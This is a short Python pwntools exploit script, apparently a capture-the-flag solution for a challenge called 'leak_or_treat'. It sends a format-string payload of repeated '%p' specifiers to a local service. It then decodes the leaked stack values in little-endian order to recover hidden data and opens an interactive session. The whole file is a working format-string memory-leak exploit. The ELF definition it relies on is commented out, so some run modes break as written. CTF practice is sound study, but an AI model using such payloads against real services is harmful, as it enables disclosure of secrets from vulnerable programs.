#!/usr/bin/python
from pwn import *

# elf = context.binary = ELF("./leak_or_treat", checksec=False)
# libc = ELF("./libc.so.6", checksec=False)
context.terminal = ['alacritty', '-e']
context.encoding = 'ascii'
context.gdbinit = '~/.config/gdb/.gdbinit'

gs = \
'''
'''

IP = "127.0.0.1"
PORT = 1337


def start(logging='notset'):
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(IP, PORT, level=logging)
    else:
        return process(elf.path, level=logging)


def pwn():
    io = start()

    io.sendlineafter("Fus Ro Dah: ", "%p " * 20)   

    io.recvuntil("*echoes back* ")
    
    leaked_data = io.recvline().split()
    plaintext_data = b""

    for i in range(len(leaked_data)):
        try:
            b = bytes.fromhex(leaked_data[i].decode()[2:])
            plaintext_data += b[::-1] # little endian so reverse order
        except:
            continue

    print(plaintext_data)

    io.interactive()
    pause()


if __name__ == "__main__":
    pwn()
